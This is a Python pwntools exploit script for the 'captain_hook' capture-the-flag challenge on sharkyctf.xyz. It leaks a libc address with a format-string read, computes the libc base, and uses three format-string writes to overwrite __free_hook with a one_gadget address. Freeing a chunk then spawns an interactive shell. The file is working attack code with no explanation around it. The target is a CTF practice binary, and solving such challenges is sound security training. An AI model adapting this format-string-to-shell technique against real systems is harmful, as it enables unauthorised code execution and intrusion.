from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./captain_hook"
HOST = "sharkyctf.xyz"
PORT = 20336

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)

#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc-2.27.so')
off_main_ret = libc.symbols["__libc_start_main"]+231
off_free_hook = libc.symbols["__free_hook"]
off_system = libc.symbols["system"]
off_binsh = next(libc.search("/bin/sh"))
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def show_list():
	conn.sendlineafter("~$ ", "1")

def add(index, name, age, date):
	conn.sendlineafter("~$ ", "2")
	conn.sendlineafter(": ", str(index))
	conn.sendlineafter(": ", name)
	conn.sendlineafter(": ", str(age))
	conn.sendlineafter(": ", date)

def read_char(index):
	conn.sendlineafter("~$ ", "3")
	conn.sendlineafter(": ", str(index))
		
def edit(index, name, age, date):
	conn.sendlineafter("~$ ", "4")
	conn.sendlineafter(": ", str(index))
	conn.sendlineafter(": ", name)
	conn.sendlineafter(": ", str(age))
	conn.sendafter(": ", date)

def delete(index):
	conn.sendlineafter("~$ ", "5")
	conn.sendlineafter(": ", str(index))

def exploit():
	add(0, "1", 1, "bb")
	payload = "A"*10
	payload += "%19$p"
	
	edit(0, payload, 8, "11/11/1111")
	read_char(0)

	conn.recvuntil("1111")
	libc_main_ret = int(conn.recvuntil(".")[:-1],16)
	libc_base = libc_main_ret - off_main_ret
	libc_free_hook = libc_base + off_free_hook
	one_gadget = libc_base + gadget[1]
	
	payload = "B"*10 #0x20
	payload += fsb(2, 11, one_gadget, 10, 1)
	payload += "A"*(0x18 - len(payload))
	payload += p64(libc_free_hook)

	edit(0, payload, 9, "00/00/0000")
	read_char(0)

	payload = "C"*10 #0x20
	payload += fsb(2, 11, (one_gadget>>16), 10, 1)
	payload += "A"*(0x18 - len(payload))
	payload += p64(libc_free_hook+2)

	edit(0, payload, 9, "00/00/0001")
	read_char(0)

	payload = "D"*10 #0x20
	payload += fsb(2, 11, (one_gadget>>32), 10, 1)
	payload += "A"*(0x18 - len(payload))
	payload += p64(libc_free_hook+4)

	edit(0, payload, 9, "00/00/0001")
	read_char(0)
	delete(0)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
